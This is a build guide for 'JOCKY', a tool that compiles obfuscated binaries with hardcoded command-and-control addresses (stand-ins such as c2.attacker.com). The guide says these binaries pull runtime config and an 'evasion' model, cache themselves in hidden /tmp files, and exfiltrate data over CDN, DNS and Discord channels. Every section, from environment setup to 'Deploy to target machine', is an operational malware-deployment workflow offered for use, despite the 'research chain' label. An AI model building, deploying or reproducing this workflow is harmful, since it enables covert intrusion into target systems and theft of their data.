# JOCKY Production Build Guide

## Overview

This guide explains how to build JOCKY research chains with compile-time injected configuration. The binary becomes completely self-contained and autonomous - it needs no manual setup on the target machine.

## Architecture

```
Build Machine:
  1. Set environment variables with C2 addresses, model repo, build ID
  2. Run build wrapper script
  3. Script injects variables into source code
  4. Compile pipeline creates binary with config hardcoded
  
Result: Obfuscated binary with all configuration embedded

Target Machine:
  1. Binary runs
  2. Bootstraps from C2 to get dynamic config
  3. Downloads model if missing
  4. Executes research chain autonomously
```

## Prerequisites

Set these environment variables on your BUILD machine (not target):

```bash
export JOCKY_C2_PRIMARY="https://c2.attacker.com/api/config"
export JOCKY_C2_FALLBACK="https://c2-backup.attacker.com/api/config"
export JOCKY_MODEL_REPO="https://models.attacker.com/models/"
export JOCKY_BUILD_ID="production_linux_$(date +%s)"
```

### What Each Variable Does

| Variable | Purpose | Example |
|----------|---------|---------|
| `JOCKY_C2_PRIMARY` | Primary command & control server for runtime config | `https://c2.yourdomain.com/api/config` |
| `JOCKY_C2_FALLBACK` | Fallback C2 if primary is down | `https://c2-backup.yourdomain.com/api/config` |
| `JOCKY_MODEL_REPO` | Where to download ML models from | `https://models.yourdomain.com/models/` |
| `JOCKY_BUILD_ID` | Unique identifier for this build (for tracking) | `prod_linux_20240929_v1` |

## Building for Linux

```bash
# Set configuration variables
export JOCKY_C2_PRIMARY="https://c2.attacker.com/api/config"
export JOCKY_C2_FALLBACK="https://c2-backup.attacker.com/api/config"
export JOCKY_MODEL_REPO="https://models.attacker.com/models/"
export JOCKY_BUILD_ID="production_linux_001"

# Build the binary (configuration injected automatically)
chmod +x scripts/build_with_config.sh
./scripts/build_with_config.sh \
    examples/research_chain_linux_production.jky \
    build/output \
    --platform linux

# Result: build/output/research_chain_linux_production (or research_chain_linux_production.exe for Windows)
```

## Building for Windows

```bash
# Set configuration variables
export JOCKY_C2_PRIMARY="https://c2.attacker.com/api/config"
export JOCKY_C2_FALLBACK="https://c2-backup.attacker.com/api/config"
export JOCKY_MODEL_REPO="https://models.attacker.com/models/"
export JOCKY_BUILD_ID="production_windows_001"

# Build the binary
./scripts/build_with_config.sh \
    examples/research_chain_linux_production.jky \
    build/output \
    --platform windows

# Result: build/output/research_chain_linux_production.exe
```

## What Gets Baked In

The compiled binary contains:

1. **C2 Addresses** - Primary and fallback server URLs (hardcoded)
2. **Model Repository** - Where to auto-download ML models from
3. **Build ID** - Unique identifier for tracking/logging
4. **Obfuscation** - All code paths obfuscated (string encryption, control flow flattening, etc.)
5. **Bootstrap Logic** - Automatically contacts C2 on startup to get dynamic configuration

## Runtime Behavior

When the binary executes on the target:

```
1. Binary launches
   ↓
2. Contacts C2 at [JOCKY_C2_PRIMARY] for configuration
   ↓
3. If C2 unreachable, tries [JOCKY_C2_FALLBACK]
   ↓
4. C2 returns JSON config:
   {
     "cdn_endpoint": "https://real.cdn/upload",
     "cdn_token": "Bearer production_token_xyz",
     "model_url": "https://models/phi3.gguf",
     "exfil_channels": ["cdn", "dns", "discord"]
   }
   ↓
5. Downloads model from [JOCKY_MODEL_REPO] if missing
   ↓
6. Caches config locally for offline operation
   ↓
7. Executes research chain with configuration
   ↓
8. Exfiltrates data to CDN endpoint from C2
```

## C2 Configuration Response Format

Your C2 server should return JSON like this:

```json
{
  "cdn_endpoint": "https://your-cdn.com/upload",
  "cdn_token": "Bearer your_auth_token_here",
  "model_url": "https://models.repo/phi3_evasion_linux.gguf",
  "model_hash": "sha256:abc123def456...",
  "exfil_channels": ["cdn", "dns", "discord"],
  "max_operations": 1000,
  "timeout_ms": 60000,
  "stealth_level": "high"
}
```

## Model Auto-Download

The binary will:

1. Check if model exists at `LOCAL_MODEL_PATH` (`/tmp/.jocky_model`)
2. If missing, download from `{JOCKY_MODEL_REPO}/phi3_evasion_linux.gguf`
3. Verify checksum against C2 config
4. Cache locally for persistence
5. Use model for threat assessment during research chain

## Target Machine Requirements

**Minimal setup - no configuration needed:**

```bash
# Just run the binary, everything is self-contained
./research_chain_linux_production

# Binary will:
# - Bootstrap from C2
# - Download model if needed
# - Execute research chain
# - Exfiltrate to configured CDN
```

## Verification

After building, verify configuration was injected:

```bash
# Extract strings from binary to verify injection
strings build/output/research_chain_linux_production | grep "attacker.com"

# Should show your C2 addresses, model repo, and build ID
```

## Security Considerations

1. **Compilation Machine** - The build machine itself sees all plaintext config
2. **Binary** - Contains hardcoded C2 addresses and model repo (visible in strings)
3. **Runtime** - C2 communication should be encrypted (HTTPS enforced)
4. **Fallback** - Both C2 servers must be accessible, or binary uses cached config
5. **Model** - Downloaded at runtime, cached locally in `/tmp/.jocky_model`

## Troubleshooting

### Binary fails to contact C2
- Verify C2 URLs are accessible from target machine
- Check firewall rules allow HTTPS outbound
- Verify JSON response format from C2

### Model download fails
- Ensure model repository is accessible
- Verify file exists at `{JOCKY_MODEL_REPO}/phi3_evasion_linux.gguf`
- Check model checksum matches C2 config

### Using cached config
- If C2 unavailable, binary automatically uses locally cached config
- Cache stored in `/tmp/.jocky_config`
- Enables offline operation with last-known-good config

## Example: Complete Build Workflow

```bash
#!/bin/bash
set -e

# Step 1: Set configuration
export JOCKY_C2_PRIMARY="https://c2.example.com/api/config"
export JOCKY_C2_FALLBACK="https://c2-backup.example.com/api/config"
export JOCKY_MODEL_REPO="https://models.example.com/models/"
export JOCKY_BUILD_ID="production_$(date +%s)"

# Step 2: Build
cd /path/to/JOCKY
chmod +x scripts/build_with_config.sh
./scripts/build_with_config.sh \
    examples/research_chain_linux_production.jky \
    build/production \
    --platform linux

# Step 3: Verify injection
echo "[*] Verifying configuration injection..."
strings build/production/research_chain_linux_production | grep "c2.example.com"

# Step 4: Transfer to target
echo "[*] Binary ready: build/production/research_chain_linux_production"
echo "[*] No environment variables needed on target machine"
echo "[*] Binary will bootstrap from C2 on execution"
```

## Next Steps

1. Set up your C2 server to handle `/api/config` requests
2. Build a production binary with your C2 addresses
3. Deploy to target machine
4. Binary will automatically bootstrap and execute

The entire research chain is now completely autonomous and self-contained!
